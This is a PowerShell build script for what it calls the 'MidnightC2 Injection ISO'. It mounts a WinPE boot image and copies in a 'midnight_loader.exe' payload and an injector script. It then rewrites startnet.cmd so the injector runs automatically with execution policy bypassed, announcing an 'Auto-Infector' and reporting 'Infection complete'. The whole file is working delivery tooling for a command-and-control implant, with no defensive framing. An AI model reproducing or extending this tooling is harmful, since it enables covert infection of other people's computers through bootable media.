# build_winpe.ps1 - Automates creation of MidnightC2 Injection ISO
# Requires: Windows ADK and WinPE Add-on installed.

$peWorkDir = "C:\MidnightWinPE"
$adkPath = "C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit"
$winpeBaseDir = "$adkPath\Windows Preinstallation Environment\amd64\en-us"
$winpeBase = "$winpeBaseDir\winpe.wim"
$copypeCmd = "$adkPath\Deployment Tools\CopyPE.cmd"
$oscdimg = "$adkPath\Deployment Tools\amd64\Oscdimg\oscdimg.exe"

$ErrorActionPreference = "Stop"

# --- Common UI Functions ---
function Write-Step($msg) { Write-Host "`n[*] $msg" -ForegroundColor Cyan }
function Write-ErrorMsg($msg) { Write-Host "[X] $msg" -ForegroundColor Red }
function Write-Info($msg) { Write-Host "[i] $msg" -ForegroundColor Gray }
function Write-Success($msg) { Write-Host "[+] $msg" -ForegroundColor Green }
# ---------------------------

# Check for WinPE Add-on
if (-not (Test-Path $winpeBase)) {
    Write-ErrorMsg "WinPE Add-on not found!"
    Write-Host "Please download and install both from these links:" -ForegroundColor Yellow
    Write-Host "1. ADK: https://go.microsoft.com/fwlink/?linkid=2196127" -ForegroundColor White
    Write-Host "2. WinPE Add-on: https://go.microsoft.com/fwlink/?linkid=2196224" -ForegroundColor White
    Write-Host "`nOr, place a 'boot.wim' file from any Windows ISO into: C:\MidnightWinPE\custom_boot.wim" -ForegroundColor Gray
    
    if (-not (Test-Path "C:\MidnightWinPE\custom_boot.wim")) {
        exit
    }
    $winpeBase = "C:\MidnightWinPE\custom_boot.wim"
    Write-Info "Using custom boot.wim found at $winpeBase"
}

# 1. Cleanup old build
if (Test-Path $peWorkDir) {
    Write-Step "Cleaning up old build directory and stuck mounts..."
    # Force unmount any stuck images first
    if (Test-Path "$peWorkDir\mount") {
        dism.exe /Unmount-Wim /MountDir:"$peWorkDir\mount" /Discard /Quiet | Out-Null
    }
    dism.exe /Cleanup-Mountpoints /Quiet | Out-Null
    dism.exe /Cleanup-Wim /Quiet | Out-Null
    
    # Try multiple times since DISM loves to lock files
    for($i=0; $i -lt 3; $i++){
        Remove-Item $peWorkDir -Recurse -Force -ErrorAction SilentlyContinue
        if(-not (Test-Path $peWorkDir)) { break }
        Start-Sleep -Seconds 2
    }
}

# 2. Create WinPE Work Dir structure from Template
Write-Step "Initializing WinPE Environment from WindowsPE SET template..."
$templateDir = Join-Path $PSScriptRoot "WindowsPE SET"

if (-not (Test-Path $templateDir)) {
    Write-ErrorMsg "Template folder 'WindowsPE SET' not found!"
    exit
}

# Ensure destination media folder exists
if (-not (Test-Path "$peWorkDir\media")) {
    New-Item -Path "$peWorkDir\media" -ItemType Directory -Force | Out-Null
}

# Copy template to media folder (Copy contents properly)
Get-ChildItem -Path "$templateDir\*" | ForEach-Object {
    Copy-Item -Path $_.FullName -Destination "$peWorkDir\media\" -Recurse -Force | Out-Null
}

New-Item -Path "$peWorkDir\media\sources" -ItemType Directory -Force | Out-Null
New-Item -Path "$peWorkDir\mount" -ItemType Directory -Force | Out-Null
New-Item -Path "$peWorkDir\fwfiles" -ItemType Directory -Force | Out-Null

# Copy boot files needed for ISO generation
if (Test-Path "$adkPath\Deployment Tools\amd64\Oscdimg") {
    Copy-Item "$adkPath\Deployment Tools\amd64\Oscdimg\efisys.bin" -Destination "$peWorkDir\fwfiles\" -ErrorAction SilentlyContinue
    Copy-Item "$adkPath\Deployment Tools\amd64\Oscdimg\etfsboot.com" -Destination "$peWorkDir\fwfiles\" -ErrorAction SilentlyContinue
}

# Fallback/Overwrite with Template boot files to ensure compatibility with the provided template
if (Test-Path "$templateDir\boot\etfsboot.com") {
    Copy-Item "$templateDir\boot\etfsboot.com" -Destination "$peWorkDir\fwfiles\" -Force
}
if (Test-Path "$templateDir\efi\microsoft\boot\efisys.bin") {
    Copy-Item "$templateDir\efi\microsoft\boot\efisys.bin" -Destination "$peWorkDir\fwfiles\" -Force
}

if (-not (Test-Path "$peWorkDir\fwfiles\etfsboot.com")) {
    Write-Warning "Missing etfsboot.com! BIOS boot might fail."
}
if (-not (Test-Path "$peWorkDir\fwfiles\efisys.bin")) {
    Write-Warning "Missing efisys.bin! UEFI boot might fail."
}

# 3. Mount Boot Image
Write-Step "Mounting boot image..."
$wimPath = "$peWorkDir\media\sources\boot.wim"
Copy-Item $winpeBase -Destination $wimPath -Force
$mountDir = "$peWorkDir\mount"
dism.exe /Mount-Wim /WimFile:$wimPath /Index:1 /MountDir:$mountDir

# 4. Inject Payload and Script
Write-Step "Injecting MidnightC2 Payload and Injector..."
$loaderSrc = ".\MidnightLoader\target\release\midnight_loader.exe"
if (-not (Test-Path $loaderSrc)) { $loaderSrc = ".\midnight_loader.exe" }
Copy-Item $loaderSrc -Destination "$mountDir\Windows\midnight_loader.exe" -Force
Copy-Item ".\winpe_injector.ps1" -Destination "$mountDir\Windows\winpe_injector.ps1" -Force

# 5. Inject PowerShell Optional Components (Required for standard WIMs)
Write-Step "Injecting PowerShell Optional Components..."
$ocPath = "$adkPath\Windows Preinstallation Environment\amd64\WinPE_OCs"
if (Test-Path $ocPath) {
    $packages = @(
        "WinPE-WMI.cab", "en-us\WinPE-WMI_en-us.cab",
        "WinPE-NetFx.cab", "en-us\WinPE-NetFx_en-us.cab",
        "WinPE-Scripting.cab", "en-us\WinPE-Scripting_en-us.cab",
        "WinPE-PowerShell.cab", "en-us\WinPE-PowerShell_en-us.cab"
    )
    foreach ($pkg in $packages) {
        $pkgPath = Join-Path $ocPath $pkg
        if (Test-Path $pkgPath) {
            dism.exe /Image:$mountDir /Add-Package /PackagePath:$pkgPath /Quiet
        }
    }
    Write-Success "PowerShell components injected."
}

# 6. Configure Auto-Run (startnet.cmd)
Write-Step "Configuring Auto-Run in startnet.cmd..."
$startnet = "$mountDir\Windows\System32\startnet.cmd"
$autoCmd = "@echo off`r`n" +
           "wpeinit`r`n" +
           "echo.`r`n" +
           "echo ========================================`r`n" +
           "echo   MidnightC2 Auto-Infector Starting...`r`n" +
           "echo ========================================`r`n" +
           "echo.`r`n" +
           "powershell.exe -NoProfile -ExecutionPolicy Bypass -File X:\Windows\winpe_injector.ps1 -Auto`r`n" +
           "if %ERRORLEVEL% NEQ 0 (`r`n" +
           "    echo.`r`n" +
           "    echo [X] ERROR: Injector failed with code %ERRORLEVEL%`r`n" +
           "    pause`r`n" +
           ") else (`r`n" +
           "    echo.`r`n" +
           "    echo [SUCCESS] Infection complete.`r`n" +
           "    echo You can now remove USB and Reboot.`r`n" +
           "    pause`r`n" +
           ")`r`n" +
           "cmd.exe`r`n"

Set-Content -Path $startnet -Value $autoCmd -Encoding Ascii

# 7. Commit and Unmount
Write-Step "Unmounting and committing changes..."
dism.exe /Unmount-Wim /MountDir:$mountDir /Commit

# 8. Generate ISO
Write-Step "Generating Bootable ISO..."
$isoPath = "D:\MidnightC2_Infector.iso"
if (Test-Path $oscdimg) {
    # -u2: UDF 2.01 (Modern OS, supports long filenames by default)
    # -o: Optimize storage
    # -m: Ignore maximum image size
    & $oscdimg -o -m -u2 "-bootdata:2#p0,e,b$peWorkDir\fwfiles\etfsboot.com#pEF,e,b$peWorkDir\fwfiles\efisys.bin" "$peWorkDir\media" "$isoPath"
}

Write-Host "`n[SUCCESS] ISO Path: $isoPath" -ForegroundColor Green
